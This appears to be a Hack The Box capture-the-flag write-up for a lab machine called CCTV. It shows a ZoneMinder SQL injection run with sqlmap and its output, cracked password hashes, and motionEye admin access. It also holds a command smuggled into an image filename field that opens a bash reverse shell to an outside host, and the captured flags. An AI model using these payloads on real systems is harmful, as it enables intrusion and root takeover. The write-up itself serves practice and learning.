	
Findings 


the site redirects to the http://cctv.htb/ and in the source code it have the login page , http://cctv.htb/zm/

```
 superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm 
 mark | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
 
```

the default creds is admin:admin

and using the `CVE-2024-51482`

```
Vulnerability : Boolean-based SQL Injection
Affected      : ZoneMinder v1.37.* <= v1.37.64
Your Version  : v1.37.63 ✓ (confirmed vulnerable)
Fixed in      : v1.37.65
CVSS Score    : 9.8 (Critical)
```

```
GET /zm/index.php?view=request&request=event&action=removetag&tid=1
                                                               ^^^
                                                         injection point
```

```
┌──(mithun㉿kali)-[~/Music/htb/CCTV]
└─$ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --dbms=MySQL --cookie="ZMSESSID=tghpnqveocplabcbroe48f2gbf" -D zm --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:36:02 /2026-04-13/

[17:36:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8059 FROM (SELECT(SLEEP(5)))gpzz)-- SuqH
---
[17:36:03] [INFO] testing MySQL
[17:36:03] [INFO] confirming MySQL
[17:36:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 8.0.0
[17:36:03] [INFO] fetching tables for database: 'zm'
[17:36:03] [INFO] fetching number of tables for database 'zm'
[17:36:03] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[17:36:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[17:36:35] [INFO] adjusting time delay to 2 seconds due to good response times
43
[17:36:47] [INFO] retrieved: Confi
[17:37:40] [ERROR] invalid character detected. retrying..
[17:37:40] [WARNING] increasing time delay to 3 seconds
g
[17:37:53] [INFO] retrieved: ControlPresets
[17:40:30] [INFO] retrieved: Controls
[17:41:06] [INFO] retrieved: Devices
[17:42:24] [INFO] retrieved: Event_Data
[17:44:33] [INFO] retrieved: Event_Summaries
[17:46:33] [INFO] retrieved: Event_
[17:47:22] [INFO] retrieved: Events
[17:48:43] [ERROR] invalid character detected. retrying..
[17:48:43] [WARNING] increasing time delay to 4 seconds
_
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] y
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y
[18:03:34] [ERROR] invalid character detected. retrying..
[18:03:34] [WARNING] increasing time delay to 5 seconds
[18:03:47] [ERROR] invalid character detected. retrying..
[18:03:47] [WARNING] increasing time delay to 6 seconds
[18:03:59] [ERROR] invalid character detected. retrying..
[18:03:59] [WARNING] increasing time delay to 7 seconds
[18:04:13] [ERROR] invalid character detected. retrying..
[18:04:13] [WARNING] increasing time delay to 8 seconds
[18:04:27] [ERROR] invalid character detected. retrying..
[18:04:27] [WARNING] increasing time delay to 9 seconds
[18:05:12] [ERROR] unable to properly validate last character value ('!')..
 !rc
[18:05:45] [ERROR] invalid character detected. retrying..
[18:05:45] [WARNING] increasing time delay to 3 seconds
hiv
[18:06:43] [ERROR] invalid character detected. retrying..
[18:06:43] [WARNING] increasing time delay to 4 seconds
ed
[18:07:14] [INFO] retrieved: Events_D
[18:08:53] [ERROR] invalid character detected. retrying..
[18:08:53] [WARNING] increasing time delay to 5 seconds
[18:09:43] [ERROR] invalid character detected. retrying..
[18:09:43] [WARNING] increasing time delay to 6 seconds
ay
[18:10:25] [INFO] retrieved: Events_Hou
[18:13:02] [ERROR] invalid character detected. retrying..
[18:13:02] [WARNING] increasing time delay to 7 seconds
[18:13:57] [ERROR] invalid character detected. retrying..
[18:13:57] [WARNING] increasing time delay to 8 seconds
r
[18:14:27] [INFO] retrieved: Events_Month
[18:18:37] [INFO] retrieved: Events_Mags
[18:21:51] [INFO] retrieved: Events_W
[18:45:30] [ERROR] invalid character detected. retrying..
[18:45:30] [WARNING] increasing time delay to 9 seconds
[19:13:04] [ERROR] invalid character detected. retrying..
[19:13:04] [WARNING] increasing time delay to 10 seconds
[19:13:18] [ERROR] invalid character detected. retrying..
[19:13:18] [WARNING] increasing time delay to 11 seconds
[19:13:34] [ERROR] invalid character detected. retrying..
[19:13:34] [WARNING] increasing time delay to 12 seconds
[19:13:50] [ERROR] invalid character detected. retrying..
[19:13:50] [WARNING] increasing time delay to 13 seconds
[19:14:08] [ERROR] unable to properly validate last character value ('')..
 e
[19:14:55] [ERROR] invalid character detected. retrying..
[19:14:55] [WARNING] increasing time delay to 3 seconds
k
[19:15:08] [INFO] retrieved: 
[19:15:23] [ERROR] invalid character detected. retrying..
[19:15:23] [WARNING] increasing time delay to 4 seconds
Filters
[19:17:11] [INFO] retrieved: Frames
[19:18:24] [INFO] retrieved: Group
[19:20:42] [ERROR] invalid character detected. retrying..
[19:20:42] [WARNING] increasing time delay to 5 seconds
s
[19:21:01] [INFO] retrieved: Groups_Mo
[19:23:20] [ERROR] invalid character detected. retrying..
[19:23:20] [WARNING] increasing time delay to 6 seconds
n
[19:24:04] [ERROR] invalid character detected. retrying..
[19:24:04] [WARNING] increasing time delay to 7 seconds
itors
[19:26:13] [INFO] retrieved: Groups_Permissions
[19:31:47] [INFO] retrieved: L
[19:33:26] [ERROR] invalid character detected. retrying..
[19:33:26] [WARNING] increasing time delay to 8 seconds
ogs
[19:35:03] [INFO] retrieved: Manuf
[19:38:05] [ERROR] invalid character detected. retrying..
[19:38:05] [WARNING] increasing time delay to 9 seconds
[19:38:27] [ERROR] invalid character detected. retrying..
[19:38:27] [WARNING] increasing time delay to 10 seconds
acturers
[19:42:21] [INFO] retrieved: Maps
[19:44:09] [INFO] retrieved: Model
[19:47:56] [ERROR] invalid character detected. retrying..
[19:47:56] [WARNING] increasing time delay to 11 seconds

[21:04:26] [INFO] retrieved: Model
[21:09:57] [INFO] retrieved: Model
[21:15:27] [INFO] retrieved: Model
[21:20:58] [INFO] retrieved: Mode
[21:23:01] [CRITICAL] unable to connect to the target URL ('No route to host'). sqlmap is going to retry the request(s)
[21:23:15] [CRITICAL] unable to connect to the target URL ('No route to host')
[21:23:15] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1371 times
```


```
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
```

so the username is opensesame

and then when we log in via the mark user ssh mark@ip and pass 

and then when we saw  the internal service enumeration

```
mark@cctv:~$ ss -tlnp
State                       Recv-Q                      Send-Q                                            Local Address:Port                                              Peer Address:Port                      Process                      
LISTEN                      0                           151                                                   127.0.0.1:3306                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:1935                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:7999                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                                 127.0.0.54:53                                                     0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:8554                                                   0.0.0.0:*                                                      
LISTEN                      0                           70                                                    127.0.0.1:33060                                                  0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:9081                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                              127.0.0.53%lo:53                                                     0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:8888                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                                    0.0.0.0:22                                                     0.0.0.0:*                                                      
LISTEN                      0                           128                                                   127.0.0.1:8765                                                   0.0.0.0:*                                                      
LISTEN                      0                           511                                                           *:80                                                           *:*                                                      
LISTEN                      0                           4096                                                       [::]:22                                                        [::]:*  
```

```
grep -Ei 'admin|password|username|run|command|on_|target|movie|picture|storage|root' /etc/motioneye/motioneye.conf /etc/motioneye/camera-1.conf /etc/motioneye/motion.conf
/etc/motioneye/motioneye.conf:run_path /run/motioneye
/etc/motioneye/motioneye.conf:#motion_binary /usr/bin/motion
/etc/motioneye/motioneye.conf:motion_control_localhost true
/etc/motioneye/motioneye.conf:motion_control_port 7999
/etc/motioneye/motioneye.conf:# interval in seconds at which motionEye checks if motion is running
/etc/motioneye/motioneye.conf:motion_check_interval 10
/etc/motioneye/motioneye.conf:motion_restart_on_errors false
/etc/motioneye/motioneye.conf:# to remove old pictures and movies
/etc/motioneye/motioneye.conf:# enable SMB shares (requires motionEye to run as root and cifs-utils installed)
/etc/motioneye/motioneye.conf:smb_mount_root /media
/etc/motioneye/motioneye.conf:# overrides the hostname (useful if motionEye runs behind a reverse proxy)
/etc/motioneye/camera-1.conf:# @storage_device custom-path
/etc/motioneye/camera-1.conf:# @network_username 
/etc/motioneye/camera-1.conf:# @network_password 
/etc/motioneye/camera-1.conf:# @upload_picture on
/etc/motioneye/camera-1.conf:# @upload_movie on
/etc/motioneye/camera-1.conf:# @upload_username 
/etc/motioneye/camera-1.conf:# @upload_password 
/etc/motioneye/camera-1.conf:# @motion_detection on
/etc/motioneye/camera-1.conf:# @preserve_pictures 0
/etc/motioneye/camera-1.conf:# @preserve_movies 0
/etc/motioneye/camera-1.conf:target_dir /var/lib/motioneye/Camera1
/etc/motioneye/camera-1.conf:locate_motion_mode off
/etc/motioneye/camera-1.conf:locate_motion_style redbox
/etc/motioneye/camera-1.conf:minimum_motion_frames 20
/etc/motioneye/camera-1.conf:movie_output_motion off
/etc/motioneye/camera-1.conf:picture_output_motion off
/etc/motioneye/camera-1.conf:picture_output off
/etc/motioneye/camera-1.conf:picture_filename %Y-%m-%d-%H-%M-%S
/etc/motioneye/camera-1.conf:picture_quality 85
/etc/motioneye/camera-1.conf:movie_filename %Y-%m-%d/%H-%M-%S
/etc/motioneye/camera-1.conf:movie_max_time 0
/etc/motioneye/camera-1.conf:movie_output off
/etc/motioneye/camera-1.conf:movie_passthrough off
/etc/motioneye/camera-1.conf:movie_codec mp4:h264_v4l2m2m
/etc/motioneye/camera-1.conf:movie_quality 75
/etc/motioneye/camera-1.conf:on_event_start /usr/local/lib/python3.12/dist-packages/motioneye/scripts/relayevent.sh "/etc/motioneye/motioneye.conf" start %t
/etc/motioneye/camera-1.conf:on_event_end /usr/local/lib/python3.12/dist-packages/motioneye/scripts/relayevent.sh "/etc/motioneye/motioneye.conf" stop %t
/etc/motioneye/camera-1.conf:on_movie_end /usr/local/lib/python3.12/dist-packages/motioneye/scripts/relayevent.sh "/etc/motioneye/motioneye.conf" movie_end %t %f
/etc/motioneye/camera-1.conf:on_picture_save /usr/local/lib/python3.12/dist-packages/motioneye/scripts/relayevent.sh "/etc/motioneye/motioneye.conf" picture_save %t %f
/etc/motioneye/motion.conf:# @admin_username admin
/etc/motioneye/motion.conf:# @normal_username user
/etc/motioneye/motion.conf:# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
/etc/motioneye/motion.conf:# @normal_password 
```

so , we found the admin hash , but we can login simple by admin:989c5a8ee87a0e9521ec81a79187d162109282f0 , and then admin taken 


```
By pasting the $(bash -c 'bash -i >& /dev/tcp/10.10.14.23/4444 0>&1').%Y-%m-%d-%H-%M-%S in the image file name and then to create the snapshot curl http://127.0.0.1:7999/1/action/snapshot

and the reverse shell is connected 

https://www.exploit-db.com/exploits/52481

```

```
root@cctv:~# cat /home/sa_mark/user.txt
cat /home/sa_mark/user.txt
24d70c53ea932caf860706f8bf619637

root@cctv:~# cat root.txt
cat root.txt
e4f26c804916853f4584ad835551ebcf

```

-----
-------
-----
------


## Solution :

First we need to open the Website and then try to find the username and password , for that i read the documentation from the Zoneminder platform , 

so the creds are admin:admin , 

After that i found that it have three user `Admin,mark,superuser` and then i found the Zoneminder version that is `37.63` and i Begin to search any `CVE-2024-51482`in that version , and luckly there is Boolean based Sql injection at the endpoint `http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1`  the tid is vulnerable ,
the example code might be 
```
$tagId = $_REQUEST['tid'];

dbQuery(
  'DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?',
  array($tagId, $_REQUEST['id'])
);

$sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId";
$rowCount = dbNumRows($sql);
```

Where the first Tagid is placed be parameter and next is $tagId that is vulnerable , so we can inject the sql there and check ours,

and then 

```
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
  --cookie="ZMSESSID=$COOKIE" \
  --dbms=MySQL \
  --technique=T \
  --time-sec=5 \
  -p tid \
  -D zm -T Users \
  -C Username,Password \
  --dump --batch \
  --hex
```

we found the mark password hash , after decode that the password is `opensesame` , then login as mark and then no file there

```
mark@cctv:~$ ls
mark@cctv:~$ ls -la
total 36
drwxr-x--- 5 mark mark 4096 Mar  2 09:49 .
drwxr-xr-x 4 root root 4096 Mar  2 09:49 ..
lrwxrwxrwx 1 root root    9 Feb 13 10:01 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 mark mark 3771 Mar 31  2024 .bashrc
drwx------ 2 mark mark 4096 Mar  2 09:49 .cache
drwx------ 3 mark mark 4096 Mar  2 09:49 .gnupg
-rw-r--r-- 1 mark mark  807 Mar 31  2024 .profile
drwx------ 2 mark mark 4096 Mar  2 09:49 .ssh
-rw-rw-r-- 1 mark mark  165 Sep 14  2025 .wget-hsts

```

and then i stared to find any internal service is running on 

```
mark@cctv:~$ ss -tlnp
State                       Recv-Q                      Send-Q                                            Local Address:Port                                              Peer Address:Port                      Process                      
LISTEN                      0                           151                                                   127.0.0.1:3306                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:1935                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                                 127.0.0.54:53                                                     0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:7999                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:8554                                                   0.0.0.0:*                                                      
LISTEN                      0                           70                                                    127.0.0.1:33060                                                  0.0.0.0:*                                                      
LISTEN                      0                           4096                                              127.0.0.53%lo:53                                                     0.0.0.0:*                                                      
LISTEN                      0                           4096                                                    0.0.0.0:22                                                     0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:9081                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                                  127.0.0.1:8888                                                   0.0.0.0:*                                                      
LISTEN                      0                           128                                                   127.0.0.1:8765                                                   0.0.0.0:*                                                      
LISTEN                      0                           4096                                                       [::]:22                                                        [::]:*          
```



and then i noticed that the motioneye is running at port 8554 and start is locally 
`ssh 9999:127.0.0.1:8554 mark@10.129.244.156` the 9999 will map to 8554 and then visit the localhost:9999 the motion eye is opening and then it ask for the username and password , after searching , it was mentioned that `admin:(blank-page)`  but for me it is not working , after guess username:password = both blank , and then login as default users and then no clue's i got so back to the mark ssh and then try to find the motion.conf and then camera- * .conf and  i got 

```
mark@cctv:~$ cat /etc/motioneye/motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 
```

and i try to crack the password hash , but i couldn't then i try to log using admin:989c5a8ee87a0e9521ec81a79187d162109282f0 it was logined and then search any CVE in `v0.43.1b4.`  and the i was the bypass the client side js validation , 

````txt
configUiValid = function() { return true; };
````

in  the console and then type  `$(bash -c 'bash -i >& /dev/tcp/10.10.14.23/4444 0>&1').%Y-%m-%d-%H-%M-%S in the image file name and then to create the snapshot curl http://127.0.0.1:7999/1/action/snapshot`

the reverse shell is connected and the root flag is 

```
root@cctv:~# cat root.txt
cat root.txt
e4f26c804916853f4584ad835551ebcf

in the root shell even i found the user flag 

cat /home/sa_mark/usre.txt
-->24d70c53ea932caf860706f8bf619637
```


